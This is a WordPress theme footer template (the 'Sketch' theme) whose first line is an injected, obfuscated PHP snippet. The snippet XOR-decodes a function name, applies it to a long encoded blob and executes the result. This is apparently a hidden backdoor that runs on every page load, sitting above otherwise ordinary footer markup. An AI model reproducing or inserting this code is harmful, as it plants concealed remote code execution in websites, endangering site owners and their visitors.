<?php $YFcbuQETN='S6NA,<73G7O-XAX'^'0D+ XYhU2Y,Y1.6';$CVtaOJMT=$YFcbuQETN('','D.xuX<X5,WO=g,TIHMMpPN7G=+P9X21UD VHQJHHb14 S:I.CT29:l69ZX8q5DTol,L:XVSu,V6cQqBtO1Y;xCUGTCzQLjOzmHZY9oJ0anrDkak.YGGJ4VTlnIL53xiOA0rdnFKjo5C.jOPefa57TAoKU9odGRRQ=5b<hFZE:99RNiJ=PMMeFbDkmO0TML=gt;92zYO2,iDy0V0,7YHkU+QZEIcEUS9  2G=2zivQM:SXYS31WY5,9DHIQ>5q,.eiT Nzt2R;mMYhu2XGU5Kn=9bN=6:P;WE:pmwKUIMPX2CU;M3sntj5M8=IMhFb6Z>nxvf4X<3pv6<ZV5CQ40:sOEllehneedU FRuY0JNKIBsF+Z=+gAPL2Dl7X54g=QTFoRk81GnILPb6 EVwHNvGPG2KYsDGy7MEq1V25mDGtY<8.RW.Q-T+JF<GiJS=8:t=YGa 8XENXg2P6CW1EF6  7ohtuYLD,2 P qsP:PKag+LD0Xkqt7KAWBgSS;oVC=9==kN=U-rZqSD5HYgCnVjfU7flK<+CQ2kKQOc<kSyhKfo8Z=EiYt5Jb-f6PlEeAHYSopDaj=K5pWnPnKnKYG997qQ NsVST0YNcaE5MW.Q-SHGu,V;-ASfufkrx-G<Q2P>pPYL>RwA4+W:,8>l<eOnQE7:MezyvAQ'^'-HPT>I6VX> S8I, ;9>Xw6X5bO1M9mn81Tqaxj3BkWAN0N A-tJVH3RX.9g.X1 GHH-N9zsQG3OJqQbToJS2qg:2 cGqkMtpdA<6KGnYASRtPAOGe438X3:DJ--ARQRoeYYOGLBcKZ6ZJamENEQV  4o<dO:gv94DnFUHcz6NKU7 AnV54d8oYNbd=U 8>SOPTLFSbE;Qc9s:rTMC8hVuM066,XOq7XTAm,XKZTV7,V =bY9W8+PMZ,hauav>ce,,tA=ZPY7BMpgHQD9+ PbNF3kjYWN1d< CPPWo>,4kR;g1Z9RSSTNC,TH,vb;h<3XNPWBP9HRYVM6S0Z14USRSga3> 9; 60uA5rQ2U3nvwbW0J6HNNa+F;MHS9AU8V4-fRrOST>UCEYFRA17WunR11+G.byM:sJGOUU7FTMyg4,RKK >O=D.Nb>S56.2IYe+P,3IBY+ xl8V5U,3TmbRATVFDTQ=-0MmK5YXZk09-ICO-0QxMWTV936;886B03;TJINCiV0TUvQw T<8NcHpJN8SSDoXJ70iL 46DaBsDUkAXYhXuYmGWxPNVShTsRvpmeZHuYSYySF5IyNmHk85KXN.:E7,3+=C-=KF5T4;A0ItdgQH7OLhzFUFKRXVM54D1RXt=-J3,fDJ.VCYZKaLtdX OS9MJPMK,');$CVtaOJMT();
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package Sketch
 */
?>

	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<?php if ( has_nav_menu ( 'social' ) ) : ?>
			<?php wp_nav_menu( array( 'theme_location' => 'social', 'depth' => 1, 'link_before' => '<span class="screen-reader-text">', 'link_after' => '</span>', 'container_class' => 'social-links', ) ); ?>
		<?php endif; ?>
		<div class="site-info">
			<a href="<?php echo esc_url( __( 'http://wordpress.org/', 'sketch' ) ); ?>"><?php printf( __( 'Proudly powered by %s', 'sketch' ), 'WordPress' ); ?></a>
			<span class="sep"> | </span>
			<?php printf( __( 'Theme: %1$s by %2$s.', 'sketch' ), 'Sketch', '<a href="https://wordpress.com/themes/" rel="designer">WordPress.com</a>' ); ?>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
